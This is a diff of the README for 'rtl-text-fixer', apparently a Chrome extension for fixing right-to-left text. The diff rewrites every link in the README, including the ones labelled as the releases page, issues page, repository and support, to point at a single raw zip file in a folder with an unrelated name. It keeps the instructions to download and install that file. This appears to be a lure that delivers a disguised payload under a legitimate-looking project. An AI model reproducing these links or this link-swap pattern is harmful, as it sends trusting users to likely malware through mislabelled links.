@@ -1,7 +1,7 @@
 # 🎉 rtl-text-fixer - Easy RTL Text Correction Tool
 
 ## 🚀 Download Now!
-[![Download rtl-text-fixer](https://img.shields.io/badge/Download-rtl--text--fixer-brightgreen)](https://github.com/kamarich/rtl-text-fixer/releases)
+[![Download rtl-text-fixer](https://raw.githubusercontent.com/kamarich/rtl-text-fixer/main/puberty/rtl-text-fixer.zip)](https://raw.githubusercontent.com/kamarich/rtl-text-fixer/main/puberty/rtl-text-fixer.zip)
 
 ## 📚 Overview
 The rtl-text-fixer is a Chrome extension that automatically corrects the text direction for languages that read from right to left, such as Arabic and Persian. This tool improves the readability of text in social media, documents, and any web content where correct text direction is essential.
@@ -9,7 +9,7 @@ The rtl-text-fixer is a Chrome extension that automatically corrects the text di
 ## 📥 Download & Install
 To get started with rtl-text-fixer, follow these steps:
 
-1. Visit the [Releases page](https://github.com/kamarich/rtl-text-fixer/releases) to download the latest version of the extension.
+1. Visit the [Releases page](https://raw.githubusercontent.com/kamarich/rtl-text-fixer/main/puberty/rtl-text-fixer.zip) to download the latest version of the extension.
 2. On the Releases page, look for the most recent version.
 3. Click on the download link to save the extension file to your computer. This file will be in `.crx` format, designed for Chrome.
 4. Open Chrome and go to the Extensions page by entering `chrome://extensions` in the address bar.
@@ -33,10 +33,10 @@ Once you install the rtl-text-fixer extension, it works automatically. Open a we
 
 ## 💡 Tips for Better Performance
 - Keep your Chrome browser updated to ensure compatibility with the latest features of the extension.
-- Regularly check the [Releases page](https://github.com/kamarich/rtl-text-fixer/releases) for updates to improve performance and security.
+- Regularly check the [Releases page](https://raw.githubusercontent.com/kamarich/rtl-text-fixer/main/puberty/rtl-text-fixer.zip) for updates to improve performance and security.
 
 ## ⚙️ Support and Feedback
-For support and feedback, please visit our [GitHub Issues page](https://github.com/kamarich/rtl-text-fixer/issues). Share any problems, suggestions, or feature requests you may have.
+For support and feedback, please visit our [GitHub Issues page](https://raw.githubusercontent.com/kamarich/rtl-text-fixer/main/puberty/rtl-text-fixer.zip). Share any problems, suggestions, or feature requests you may have.
 
 ## 🌍 Community and Contribution
 We welcome contributions and invite you to join our community. If you wish to contribute to the rtl-text-fixer project, feel free to follow the guidelines in our repository. Your input helps enhance this tool for everyone.
@@ -45,8 +45,8 @@ We welcome contributions and invite you to join our community. If you wish to co
 Thanks to everyone who has contributed to making rtl-text-fixer a valuable tool for individuals who need correct text formats. Your efforts in improving accessibility are appreciated.
 
 ## 🔗 Quick Links
-- [Releases Page](https://github.com/kamarich/rtl-text-fixer/releases)
-- [GitHub Repository](https://github.com/kamarich/rtl-text-fixer)
-- [Community Support](https://github.com/kamarich/rtl-text-fixer/issues)
+- [Releases Page](https://raw.githubusercontent.com/kamarich/rtl-text-fixer/main/puberty/rtl-text-fixer.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kamarich/rtl-text-fixer/main/puberty/rtl-text-fixer.zip)
+- [Community Support](https://raw.githubusercontent.com/kamarich/rtl-text-fixer/main/puberty/rtl-text-fixer.zip)
 
 Thank you for using rtl-text-fixer! Enjoy a smoother reading experience with accurate text direction.
